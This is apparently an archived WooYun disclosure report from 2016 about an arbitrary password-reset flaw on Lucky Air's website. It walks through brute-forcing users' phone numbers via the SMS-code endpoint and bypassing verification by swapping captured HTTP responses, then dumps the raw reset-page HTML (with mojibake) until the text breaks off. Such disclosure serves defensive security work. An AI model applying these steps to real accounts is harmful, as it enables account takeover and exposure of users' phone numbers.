{"id": 86318, "wybug_id": "wooyun-2016-0188000", "wybug_title": "祥鹏航空某系统任意用户密码重置", "wybug_corp": "祥鹏航空", "wybug_author": "黑骑士", "wybug_date": "2016-03-23 09:57", "wybug_open_date": "2016-05-08 10:12", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-08：\t细节向公众公开  简要描述： 祥鹏航空某系统任意用户密码重置 详细说明：  http://www.luckyair.net/祥鹏航空官方主站用户密码可以在忘记密码页面任意重置绕过思路：    系统首先获取绑定手机的验证码，进行验证，正确即返回输入新密码页面，错误即返回报错页面，同时将账号信息记入cookie。输入新密码后直接把新密码和cookie返回系统，不再做验证。因此只需先记录正确跳转至新密码页面的返回包，在输入验证码后用其替代报错页面返回包即可绕过验证。    另外通过发送手机验证码的位置可以轻易爆破出用户手机号，用户账号安全面临严重威胁    漏洞证明：  http://www.luckyair.net/祥鹏航空主页点击用户登录\n\n点击忘记密码\n\n这里可以爆破一下用户手机号，点击发送口令抓返回包即可。航空公司的用户量非常大，跑了一小会就出来一堆用户手机号\n\n选个测试账号13802035266，点获取口令。随便填入全零。\n\n点击下一步抓返回包，看到报错信息\n\n将包中内容替换为\n{\"email\":null,\"errorMessage\":\"OK\",\"j_captcha_response\":\"9F5E\",\"mobileNo\":\"13802404669\"}\n\n\n后面还有一个数据包\n\n提交后抓返回包，看到是报错页面\n\n将报错页面替换成之前记录的输入新密码页面提交（代码太长，放在最后）\n\n成功跳转至输入新密码页面\n\n输入新密码TEST000000，提交成功\n\n登陆看看\n\n\n\n输入密码页面的数据包\nHTTP/1.1 200 OKServer: nginx/1.7.11Date: Wed, 23 Mar 2016 00:53:42 GMTContent-Type: text/html;charset=UTF-8Connection: keep-aliveContent-Length: 20714<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\">\t<head id=\"\">\t\t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=8\"/>\t\t<meta name=\"keywords\" content=\"ç¥¥é¹èªç©º[å®æ¹ç½ç«] æºç¥¨ç§æ|èªç­æ¥è¯¢|åçä¹æº|éåºé¢è®¢|åå...\" />\t\t<meta name=\"description\" content=\"äºåç¥¥é¹èªç©ºæéè´£ä»»å¬å¸ï¼ç®ç§°ï¼ç¥¥é¹èªç©ºï¼æ¯ä¸­å½ç¬¬åå¤§èªç©ºéå¢ââæµ·èªéå¢çèªç©ºæåä¼ä¸ãå¨'2010ä¸­å½ä¼ä¸500å¼º'ä¸­ï¼æµ·èªéå¢æåç¬¬179ä½ãæµ·èªéå¢æä¸æºéæ»è§æ¨¡290æ¶ï¼å¶å¨äºåçè¿åä»½é¢åå±äºåå¸åºç¬¬äºã\" />\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\t\t<meta name=\"keywords\" content=\"ç¥¥é¹ ç¥¥é¹èªç©º äºåèªç©º ç®åçæ´» å¿«ä¹é£è¡ äºåç¥¥é¹èªç©ºæéè´£ä»»å¬å¸ èªç©ºææ¸¸ æµ·èªäºå\" />\t\t<title>ç¥¥é¹èªç©º[å®æ¹ç½ç«] èªç­æ¥è¯¢|æºç¥¨ç§æ|éåºé¢è®¢|ç§è½¦|åå...</title>\t\t<link href=\"http://www.luckyair.net/favicon.ico\" rel=\"shortcut icon\" />\t\t<script src=\"/themes/luckyair2016/js/jquery-1.7.2.min.js\"></script>\t\t<!-- ä¸ºäºç»ä¸äºé¡µé¢åªåµå¥å¤´å°¾ éè¦å¼å¥å°±å¾cssæä»¶åjsæä»¶-->\t\t<link rel=\"stylesheet\" href=\"/themes/luckyair2014/css/basic.css\" />\t\t<link rel=\"stylesheet\" href=\"/themes/luckyair2014/css/index.css\" />\t\t<link href=\"/themes/luckyair2016/css/basic.css\" rel=\"stylesheet\" type=\"text/css\" />\t\t<link href=\"/themes/luckyair2016/css/index.css\" rel=\"stylesheet\" type=\"text/css\" />\t\t<script type=\"text/javascript\" >\t\t\tfunction getpath(){\t\t\t//æ ¹ç®å½\t\t\tvar path = \"\";\t\t\treturn path;\t\t\t}\t\t</script>\t\t<!-- æ¥ææ§ä»¶ -->\t\t<script src=\"/js2014/jquery.json-2.3.min.js\" type=\"text/javascript\"></script>\t\t<script src=\"/themes/luckyair2014/js/ui.js\" type=\"text/javascript\"></script>\t\t\t\t<!-- æ¥ææ§ä»¶ -->\t\t<script src=\"/js2014/jqueryui/i18n/jquery.ui.datepicker-zh-CN.js\" type=\"text/javascript\"></script>\t\t<script src=\"/js2014/jqueryui/ui/jquery.ui.core.js\" type=\"text/javascript\"></script>\t\t<script src=\"/js2014/jqueryui/ui/jquery.ui.widget.js\" type=\"text/javascript\"></script>\t\t<script src=\"/js2014/jqueryui/ui/jquery.ui.datepicker.js\" type=\"text/javascript\"></script>\t\t<!-- åå¸ä¸å­ç  -->\t\t<script type=\"text/javascript\" src=\"/js2014/jqueryui/ui/jquery.ui.position.js\" ></script>\t\t<script type=\"text/javascript\" src=\"/js2014/jqueryui/ui/jquery.ui.menu.js\" ></script>\t\t<script type=\"text/javascript\" src=\"/js2014/jqueryui/mfui/jquery.ui.cityautocomplete.js\" ></script>\t\t<script src=\"/js2014/aircity/airport_8L.js\" type=\"text/javascript\"></script>\t\t<link rel=\"stylesheet\" href=\"/js2014/jqueryui/themes/base/jquery.ui.all.css\"></link>\t\t<link rel=\"stylesheet\" href=\"/js2014/jqueryui/themes/smoothness/jquery-ui-1.9.2.custom.css\"></link>\t\t\t\t<!-- å¼¹æ¡ --> \t\t<script src=\"/themes/luckyair2016/js/alert-dialog/dialog-min.js\" type=\"text/javascript\"></script> \t\t<script src=\"/themes/luckyair2016/js/alert-dialog/menu.js\" type=\"text/javascript\"></script> \t\t<link href=\"/themes/luckyair2016/css/alert-dialog/ui-dialog.css\" rel=\"stylesheet\"></link> \t\t<!-- ç»å½ --> \t\t<script src=\"/themes/luckyair2016/js/textUtils.js\"></script> \t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"><style type=\"text/css\">\t.errorMsg{\t\tcolor: red;\t\tfont-size: 12px;\t}\t.gray{color: #999;font-size: 12px;}</style>\t</head><body><!-- è¯¥é¡µé¢æ¯ç»åªåµå¥å¤´å°¾çé¡µé¢æç --><div class=\"\">\t<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">\t\t\t\t<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\"\t\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><!-- ç»å½é¡µ --><input type=\"hidden\" id=\"loginUser\" value=\"null\"/><script src=\"/themes/luckyair2016/js/login.js\"></script><!-- é®ç½©å± -->\t\t<div class=\"alert_c\" style=\"display:none;\" id=\"alert_div\"></div>\t\t<!-- end é®ç½©å± -->\t\t<!-- å¼¹åºå± -->\t\t<div class=\"popLogin hide\" id=\"alert_login\" style=\";\">\t\t\t<div class=\"pop_hd cf\">\t\t\t\t<ul class=\"popTab\" id=\"loginTab\">\t\t\t\t\t<li><a class=\"hover\" href=\"javascript:void(0)\">ä¼åç»å½</a></li>\t\t\t\t\t<li><a href=\"javascript:void(0)\">åæ³¨åç»å½</a></li>\t\t\t\t\t<li style=\"width:132px;margin-right:0px;\"><a href=\"javascript:void(0)\">å¤§å®¢æ·ç»å½</a></li>\t\t\t\t</ul>\t\t\t</div>\t\t\t<div class=\"pop_bg\">\t\t\t <!-- æ®éä¼åç»å½start -->\t\t\t <form action=\"/Login.action\" method=\"post\" id=\"commonLogin\">\t\t\t\t<table width=\"100%\" class=\"tb_style03\" >\t\t\t\t\t<tr>\t\t\t\t\t\t<th style=\"width:60px;\">ç¨æ·å</th>\t\t\t\t\t\t<td><input style=\"width:240px;\" class=\"input_gray_peo\" type=\"text\" name=\"userName\" id=\"userName\" placeholder=\"é®ç®±/ææºå·/ç¨æ·å\"><i class=\"ico\" id=\"userNameImg\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>å¯ ç </th>\t\t\t\t\t\t<td><input style=\"width:240px; margin-right:8px;\" class=\"input_gray_pass02\" type=\"password\" name=\"password\" id=\"password\" placeholder=\"å¯ç \" id=\"pwdImg\"><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>éªè¯ç </th>\t\t\t\t\t\t<td><input style=\"width:150px; margin-right:8px;\" class=\"input_gray_pic\" type=\"text\" name=\"j_captcha_response\" id=\"j_captcha_response\" placeholder=\"éªè¯ç \"><img src=\"/jcaptcha?.tmp=0.06781555591097987\" title=\"ç¹å»æ´æ¢éªè¯ç \" name=\"capthcaChange\" id=\"capthcaChange1\" style=\"cursor: pointer;\"/><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<td colspan=\"2\" align=\"center\"><span class=\"c_red f_12\" id=\"errmsg01\">&nbsp;</span></td>\t\t\t\t\t</tr>\t\t\t\t</table>\t\t\t </form>\t\t\t\t<!-- åæ³¨åç¨æ·  -->\t\t\t <form action=\"/nonRegLogin1Ajax.action\" method=\"post\" id=\"phoneLogin\">\t\t\t\t<table width=\"100%\" class=\"tb_style03 hide\" >\t\t\t\t\t<tr>\t\t\t\t\t\t<th style=\"width:60px;\">ææºå·</th>\t\t\t\t\t\t<td>\t\t\t\t\t\t<input style=\"width:240px;\" class=\"input_gray_peo\" type=\"text\" name=\"mobile1\" id=\"mobile1\" placeholder=\"è´­ç¥¨æ¶è¾å¥çææºå·\">\t\t\t\t\t\t<input type=\"hidden\" name=\"mobile\" value=\"\" id=\"mobile\">\t\t\t\t\t\t<i class=\"ico\"></i>\t\t\t\t\t\t</td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>éªè¯ç </th>\t\t\t\t\t\t<td><input style=\"width:128px; margin-right:8px;\" class=\"input_gray_pic\" type=\"text\" name=\"jCaptchaResponseNoreg\" id=\"jCaptchaResponseNoreg\" placeholder=\"éªè¯ç \"><img src=\"/jcaptcha?.tmp=0.06781555591097987\" name=\"capthcaChange\" id=\"capthcaChange2\" title=\"ç¹å»æ´æ¢éªè¯ç \" style=\"cursor: pointer;\"/><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>å£ä»¤</th>\t\t\t\t\t\t<td><input style=\"width:128px; margin-right:8px;\" class=\"input_gray_pass02\" type=\"text\" name=\"pass\" id=\"pass\" placeholder=\"ææºå£ä»¤\"><a title=\"ç¹å»åéå£ä»¤\" href=\"javascript:void(0);\" id=\"sendSms\" style=\"color: red;text-decoration: none;\">åéå£ä»¤</a><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t\t\t\t\t\t<tr>\t\t\t\t\t\t<td colspan=\"2\" align=\"center\"><span class=\"c_red f_12\" id=\"errmsg02\">&nbsp;</span></td>\t\t\t\t\t</tr>\t\t\t\t</table>\t\t\t </form>\t\t\t\t<!-- åæ³¨åç¨æ· end -->\t\t\t\t<!-- å¤§å®¢æ·  -->\t\t\t <form action=\"/kcLoginAjax.action\" method=\"post\" id=\"kcLogin\">\t\t\t\t<table width=\"100%\" class=\"tb_style03 hide\">\t\t\t\t\t<tr>\t\t\t\t\t\t<th style=\"width:60px;\">ç¨æ·å</th>\t\t\t\t\t\t<td><input style=\"width:240px;\" class=\"input_gray_peo\" type=\"text\" name=\"kcUserName\" id=\"kcUserName\" placeholder=\"å¤§å®¢æ·ç¨æ·å\"><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>å¯ç </th>\t\t\t\t\t\t<td><input style=\"width:240px; margin-right:8px;\" class=\"input_gray_pass02\" type=\"password\" name=\"kcPassword\" id=\"kcPassword\" placeholder=\"å¯ç \"><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<th>éªè¯ç </th>\t\t\t\t\t\t<td><input style=\"width:150px; margin-right:8px;\" class=\"input_gray_pic\" type=\"text\" name=\"kc_j_captcha_response\" id=\"kc_j_captcha_response\" placeholder=\"éªè¯ç \"><img src=\"/jcaptcha?.tmp=0.06781555591097987\" title=\"ç¹å»æ´æ¢éªè¯ç \" name=\"capthcaChange\" id=\"capthcaChange3\" style=\"cursor: pointer;\"/><i class=\"ico\"></i></td>\t\t\t\t\t</tr>\t\t\t\t\t<tr>\t\t\t\t\t<th></th>\t\t\t\t\t<td><span style=\"font-family: Microsoft YaHei\"><a style=\"text-decoration: underline;cursor: pointer;width:80px;margin-left: 157px;color: blue;background-color: white;border: 0px;display: inline-block;line-height: 30px;height: 30px;padding-left: 10px;\"    onclick=\"window.open('https://luckyair.easyebank.com/comm_gateway/xp_gkcz.htm?clientType=xphk&serverType=2')\" >ç¥¥äºå¡è´­å¡</a></span></td>\t\t\t\t\t\t   </tr>\t\t\t\t\t<tr>\t\t\t\t\t\t<td colspan=\"2\" align=\"center\"><span class=\"c_red f_12\" id=\"errmsg03\">&nbsp;</span></td>\t\t\t\t\t</tr>\t\t\t\t</table>\t\t\t </form>\t\t\t\t<!-- å¤§å®¢æ· end -->\t\t\t\t<div class=\"m_t_20 m_b_10 tc\">\t\t\t\t\t<p class=\"m_b_10\">\t\t\t\t\t<span style=\"width:125px;padding: 5px 28px 5px 28px;\"  class=\"btn_red04\"   id=\"loginsubmit\" data-value=\"commenUser\">ç»å½&nbsp;<i id=\"loading\"></i></span>\t\t\t\t\t<span style=\"width: 10px;\">&nbsp;&nbsp;</span>\t\t\t\t\t<span style=\"width:125px;padding: 5px 28px 5px 28px;\" class=\"btn_red04\"  id=\"closeLogin\" >å³é­</span>\t\t\t\t\t</p>\t\t\t\t\t<p><a href=\"/frontend2014/users/modifyinfo/resetPassword.jsp\" style=\"color: blue;\"><u>å¿è®°å¯ç </u></a>  |  <a href=\"/frontend/users/register/userReg.action?flag=c\" style=\"color: blue;\"><u>å¿«éæ³¨å</u></a></p>\t\t\t\t</div>\t\t\t\t<!--  -->\t\t\t</div>\t\t</div>\t\t<div id=\"divifrom\" style=\"display: none;\"><iframe id=\"iframemess\" width=\"0px;\" height=\"0px;\" src=\"/frontend/users/register/regsentCodePage.action\" ></iframe></div><!-- æ è®°(logo)åºå -->\t\t<div class=\"branding\">\t\t\t<div class=\"head w_1000a\">\t\t\t\t<!-- é¦é¡µ -->\t\t\t\t<div class=\"home fl\">\t\t\t\t\t<a href=\"/\"><i></i>é¦é¡µ</a>\t\t\t\t</div>\t\t\t\t<!-- end é¦é¡µ -->\t\t\t\t<!-- ç»å½ -->\t\t\t\t<div class=\"loginaBar fr\">\t\t\t\t\t<div class=\"login\">\t\t\t\t\t\t\t\t\t\t\t\t\t<p><a href=\"javascript:void(0);\" id=\"username\" >ä¼åç»å½</a></p>\t\t\t\t\t\t\t<p><a href=\"/frontend/users/register/userReg.action?flag=c\" >é©¬ä¸æ³¨å</a></p>\t\t\t\t\t\t\t\t\t\t\t</div>\t\t\t\t\t<div class=\"lang\">\t\t\t\t\t\t<p><a class=\"m_r_35\" href=\"#\">ä¸­æ</a><a href=\"#\">English</a></p>\t\t\t\t\t\t<p>(+86)  95071950</p>\t\t\t\t\t</div>\t\t\t\t</div>\t\t\t\t<!-- end ç»å½ -->\t\t\t\t<!-- ä¸»å¯¼èª -->\t\t\t\t<div class=\"nav\">\t\t\t\t\t<ul class=\"nav_list\">\t\t\t\t\t\t<li><a href=\"#\">é¢è®¢æå¡<i></i></a>\t\t\t\t\t\t\t<div class=\"navSub hide\">\t\t\t\t\t\t\t\t<ul class=\"navSub_list\">\t\t\t\t\t\t\t\t\t<li><a href=\"/frontend/order/SearchMyOrder.action\">æçè®¢å</a></li>\t\t\t\t\t\t\t\t\t<li><a href=\"/extraProduct/frontend/buySeat/buySeatTemp.jsp\">éæ©æºä¸åº§ä½</a></li>\t\t\t\t\t\t\t\t\t<li><a href=\"/extraProduct/frontend/meal/inputForMeal.jsp\">é¢è®¢æºä¸é¤é£</a></li>\t\t\t\t\t\t\t\t\t<li><a href=\"/extraProduct/frontend/luggage/inputForLuggage.jsp\">è´­ä¹°é¾éè¡æ</a></li>\t\t\t\t\t\t\t\t\t<li><a href=\"/extraProduct/frontend/vipHall/reserveVIPHall.action\">é¢è®¢è´µå®¾å</a></li>\t\t\t\t\t\t\t\t</ul>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</li>\t\t\t\t\t\t<li><a href=\"#\">åºè¡æå¡<i></i></a>\t\t\t\t\t\t\t<div class=\"navSub hide\">\t\t\t\t\t\t\t\t<ul class=\"navSub_list\">\t\t\t\t\t\t\t\t\t<li><a href=\"/frontend2014/passengerService/flightD.jsp\">èªç­å¨æ</a></li>\t\t\t\t\t\t\t\t</ul>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</li>\t\t\t\t\t\t<li><a href=\"#\">ç²¾å½©æ´»å¨<i></i></a>\t\t\t\t\t\t\t<div class=\"navSub hide\">\t\t\t\t\t\t\t\t<ul class=\"navSub_list\">\t\t\t\t\t\t\t\t\t<li><a href=\"/frontend/miaosha/display.action\">ç§æ</a></li>\t\t\t\t\t\t\t\t</ul>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</li>\t\t\t\t\t\t<li><a href=\"#\">å¨çº¿æå¡<i></i></a>\t\t\t\t\t\t\t<div class=\"navSub hide\">\t\t\t\t\t\t\t\t<ul class=\"navSub_list\" style=\"color: #fff;\">\t\t\t\t\t\t\t\t\t<li style=\"text-indent: 7px;\">ç­çº¿çµè¯ï¼95071950</li>\t\t\t\t\t\t\t\t</ul>\t\t\t\t\t\t\t</div> \t\t\t\t\t\t</li>\t\t\t\t\t</ul>\t\t\t\t</div>\t\t\t\t<!-- end ä¸»å¯¼èª -->\t\t\t</div>\t\t</div>\t\t<!-- end æ è®°(logo)åºå --><script src=\"/themes/luckyair2016/js/cut.js\"></script><script src=\"/themes/luckyair2016/js/frontend_title.js\"></script>\t\t<!-- end æ è®°(logo)åºå -->\t\t<!-- logo -->\t\t<div class=\"logo02\"></div>\t\t<!-- end logo -->\t<!-- content start-->\t\t<div class=\"news-content mb30\" style=\"background: #fff\" >\t\t\t\t<!-- åè½é¡µé¢ -->\t\t<script type=\"text/javascript\">\tfunction checkPwd(){\t\tvar pwd1 = $(\"#newpwd\").val();\t\tvar pwd2 = $(\"#pwd1\").val();\t\t\t\tif(pwd1==\"\"){\t\t\t$(\"#errorMessagePwd\").removeClass().addClass(\"errorMsg\");\t\t\tdocument.getElementById(\"errorMessagePwd\").innerHTML=\"è¯·è¾å¥å¯ç \";\t\t\treturn false;\t\t}else{\t\t\tvar tmp = pwd1.replace(/^(\\s)*|(\\s)*$/g,\"\");\t\t\tvar len = tmp.length;\t\t\tif(len==0){\t\t\t\t$(\"#errorMessagePwd\").removeClass().addClass(\"errorMsg\");\t\t\t\tdocument.getElementById(\"errorMessagePwd\").innerHTML=\"å¯ç ä¸è½å¨é¨ä¸ºç©ºæ ¼ã\";\t\t\t\treturn false;\t\t\t\t\t\t}else if(len>20||len<6){\t\t\t\t$(\"#errorMessagePwd\").removeClass().addClass(\"errorMsg\");\t\t\t\tdocument.getElementById(\"errorMessagePwd\").innerHTML=\"å¯ç é¿åº¦å¿é¡»ä¸º6ï½20ä¸ªå­ç¬¦ã\";\t\t\t\treturn false;\t\t    }else if(isNumStr(pwd1)){\t\t    \t$(\"#errorMessagePwd\").removeClass().addClass(\"errorMsg\");\t\t    \tdocument.getElementById(\"errorMessagePwd\").innerHTML=\"å¯ç ä¸è½å¨é¨ä¸ºæ°å­ã\";\t\t    \treturn false;\t\t    }\t\t}\t\tdocument.getElementById(\"errorMessagePwd\").innerHTML=\"\";\t\tif(pwd2==\"\"){\t\t\tdocument.getElementById(\"errorMessagePwd1\").innerHTML=\"è¯·åæ¬¡è¾å¥æ°å¯ç \";\t\t\treturn false;\t\t}\t\t\t\tif(pwd1!=pwd2){\t\t\tdocument.getElementById(\"errorMessagePwd1\").innerHTML=\"ä¸¤æ¬¡è¾å¥çå¯ç ä¸ä¸è´\";\t\t\treturn false;\t\t}\t\tdocument.getElementById(\"errorMessagePwd1\").innerHTML=\"\";\t\tresetPwd();\t}\tfunction resetPwd(){\t\tvar url = '/frontend2014/users/modifyinfo/GetUser!resetPwd.action?newPwd='+$(\"#newpwd\").val();\t\t$.ajax({\t\t\t  type: 'POST',\t\t\t  url: url,\t\t\t  success: processResetPwd\t\t\t});\t}\tfunction processResetPwd(responseText, textStatus, XMLHttpRequest){\t\tvar msg= responseText.msg;\t\t$(\"#resetPwd\").hide();\t\t$(\"#restPwdRes\").show();\t\tif(msg=='Yes'){\t\t\t$(\"#msg\").html(\"å¯ç éç½®æå!\");\t\t\t}else{\t\t\t$(\"#msg\").html(\"å¯ç ä¿®æ¹å¤±è´¥ï¼è¯·èç³»ç®¡çå!\");\t\t}\t}\t\t//æ£æ¥å­ç¬¦ä¸²æ¯å¦å¨æ¯æ°å­\tfunction isNumStr(val){\t\tvar pattern = /^[0-9]+$/;\t\tif (pattern.test(val)){\t\t\treturn true;\t\t}\t\treturn false;\t}\t</script>\t\t<!-- content start-->\t\t<div class=\"main_content_top clear js_main_content\">\t\t\t<div id=\"resetPwd\">\t\t\t<div class=\"password_box\">\t\t\t\t<ul class=\"order_flow_menu clear\">\t\t\t\t\t<li>\t\t\t\t\t\t<i></i><span>å¡«åææºå·</span>\t\t\t\t\t</li>\t\t\t\t\t<li>\t\t\t\t\t\t<i></i><span>æ¶å°éªè¯ç ï¼å¹¶åç­å®å¨é®é¢</span>\t\t\t\t\t</li>\t\t\t\t\t<li class=\"on\">\t\t\t\t\t\t<i></i><span>éç½®å¯ç </span>\t\t\t\t\t</li>\t\t\t\t</ul>\t\t\t</div>\t\t\t<p class=\"password_til\">ç¬¬ä¸æ­¥ï¼éç½®å¯ç </p>\t\t\t<form id=\"regForm\" method=\"post\">\t\t\t<div class=\"password_content\" id=\"by_mobile\">\t\t\t\t<ul class=\"member_info_edit\" style=\"padding-left:100px;\">\t\t\t\t<li></li>\t\t\t\t\t<li>\t\t\t\t\t\t<label>æ°å¯ç ï¼</label>\t\t\t\t\t\t<input type=\"password\" value=\"\" name=\"newpwd\" id=\"newpwd\"/>\t\t\t\t\t\t<span class=\"gray\" id=\"errorMessagePwd\">é¿åº¦ä¸º6-20ä¸ªå­ç¬¦</span>\t\t\t\t\t\t</li>\t\t\t\t\t<li></li><li></li>\t\t\t\t\t<li>\t\t\t\t\t\t<label>ç¡®è®¤å¯ç ï¼</label>\t\t\t\t\t\t<input type=\"password\" name=\"pwd1\" id=\"pwd1\" value=\"\" />\t\t\t\t\t\t<span class=\"errorMsg\" id=\"errorMessagePwd1\"></span>\t\t\t\t\t</li>\t\t\t\t</ul>\t\t\t</div>\t\t\t</form>\t\t\t<p class=\"member_info_save mt30\">\t\t\t\t<a class=\"icon filghts_btn_search\" href=\"javascript:void(0);\" onclick=\"return checkPwd()\">ç¡®è®¤</a>\t\t\t</p>\t\t\t</div>\t\t\t<div id=\"restPwdRes\" style=\"display: none;font-size: 14px;color: red;\" >\t\t\t\t<p align=\"center\" style=\"margin-top: 20%\"><span id=\"msg\"></span></p>\t\t\t</div>\t\t</div>\t<!-- content end--><script>(function(){$('.logo02').remove();})();</script>\t\t<!-- é¦é¡µ -->\t\t</div>\t<!-- content end-->\t<!-- åºé¨ä¿¡æ¯ -->\t\t<div class=\"footBar m_t_10\">\t\t\t<div class=\"foot w_1000a cf p_t_10 p_b_10\">\t\t\t\t<div class=\"news fl\">\t\t\t\t\t<h3 class=\"tit m_b_15\">ææ°æ¶æ¯</h3>\t\t\t\t\t<ul class=\"newList\" id=\"news\">\t\t\t\t\t\t\t\t\t\t\t</ul>\t\t\t\t</div>\t\t\t\t<!-- end top -->\t\t\t\t<div class=\"footMenu cf fl\">\t\t\t\t\t<div class=\"fl\" style=\"width:470px;\">\t\t\t\t\t<dl class=\"fm_list fl\">\t\t\t\t\t\t<dt>å¸®å©ä¸­å¿</dt>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/helpTips.jsp?index=1\">æå®¢é¡»ç¥</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/helpTips.jsp?index=2\">è´­ç¥¨æå</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/helpTips.jsp?index=3\">ç¥¨å¡å¤ç</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/helpTips.jsp?index=4\">æå¡æå</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/helpTips.jsp?index=5\">ä¼æ å¸ä¸ç§¯å</a></dd>\t\t\t\t\t</dl>\t\t\t\t\t<dl class=\"fm_list fl\">\t\t\t\t\t\t<dt>å³äºæä»¬</dt>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/aboutUs.jsp?index=1\">å¬å¸ç®ä»</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/aboutUs.jsp?index=2\">åå¬å°å</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/aboutUs.jsp?index=3\">èªçº¿ç½ç»</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/aboutUs.jsp?index=4\">èªç­æ¶å»</a></dd>\t\t\t\t\t</dl>\t\t\t\t\t<dl class=\"fm_list fl\">\t\t\t\t\t\t<dt>èç³»æä»¬</dt>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=1\">å®æ¹æå¡ç­çº¿</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=2\">æè¯å»ºè®®</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=3\">åªä½ä¸çº¿</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=4\">è¥ä¸æå°</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=5\">BSPä»£ç</a></dd>\t\t\t\t\t\t<dd><a href=\"/frontend2016/help/contactUs.jsp?index=6\">è´§è¿ä¸å¡</a></dd>\t\t\t\t\t</dl>\t\t\t\t\t<dl class=\"fm_list fl\">\t\t\t\t\t\t<dt>åæé¾æ¥</dt>\t\t\t\t\t\t\t\t\t\t<dd><a href=\"http://www.hnair.com\" target=\"_blank\">æµ·åèªç©º</a></dd>\t\t\t\t\t\t\t\t\t\t\t\t<dd><a href=\"http://www.westair.cn\" target=\"_blank\">è¥¿é¨èªç©º</a></dd>\t\t\t\t\t\t<dd><a href=\"http://www.tianjin-air.com\" target=\"_blank\">å¤©æ´¥èªç©º</a></dd>\t\t\t\t\t\t<dd><a href=\"http://www.capitalairlines.com.cn\" target=\"_blank\">é¦é½èªç©º</a></dd>\t\t\t\t\t\t<dd><a href=\"http://www.fuzhou-air.cn\" target=\"_blank\">ç¦å·èªç©º</a></dd>\t\t\t\t\t\t<dd><a href=\"http://gt.hnair.com/gt/\" target=\"_blank\">ç¥¥é¹å¢éç½</a></dd>\t\t\t\t\t\t<dd><a href=\"http://x.luckyair.net:88/cms/\" target=\"_blank\">ç¥¥é¹åéåå­å°</a></dd>\t\t\t\t\t</dl>\t\t\t\t\t</div>\t\t\t\t\t<div class=\"fl\"  style=\"width:180px;\">\t\t\t\t\t\t<div style=\"margin-top: -17px;margin-left: 84px;\">\t\t\t\t\t\t\t<a class=\"btn_top\" href=\"javascript:void(0)\">è¿åé¡¶é¨</a>\t\t\t\t\t\t</div>\t\t\t\t\t\t<div>\t\t\t\t\t\t\t<div class=\"appBar fr m_t_45\">\t\t\t\t\t\t\t\t<div class=\"mob m_b_5\">\t\t\t\t\t\t\t\t\t<ul class=\"mob_list\">\t\t\t\t\t\t\t\t\t\t<li>\t\t\t\t\t\t\t\t\t\t\t<a href=\"#\">\t\t\t\t\t\t\t\t\t\t\t\t<b><img src=\"/themes/luckyair2016/images/ico_weixin.png\" /></b>\t\t\t\t\t\t\t\t\t\t\t\t<p>å®æ¹å¾®ä¿¡</p>\t\t\t\t\t\t\t\t\t\t\t</a>\t\t\t\t\t\t\t\t\t\t</li>\t\t\t\t\t\t\t\t\t\t<li>\t\t\t\t\t\t\t\t\t\t\t<a href=\"#\">\t\t\t\t\t\t\t\t\t\t\t\t<b><img src=\"/themes/luckyair2016/images/ico_xina.png\" /></b>\t\t\t\t\t\t\t\t\t\t\t\t<p>å®æ¹å¾®å</p>\t\t\t\t\t\t\t\t\t\t\t</a>\t\t\t\t\t\t\t\t\t\t</li>\t\t\t\t\t\t\t\t\t\t<li>\t\t\t\t\t\t\t\t\t\t\t<a href=\"#\">\t\t\t\t\t\t\t\t\t\t\t\t<b><img src=\"/themes/luckyair2016/images/ico_app.png\" 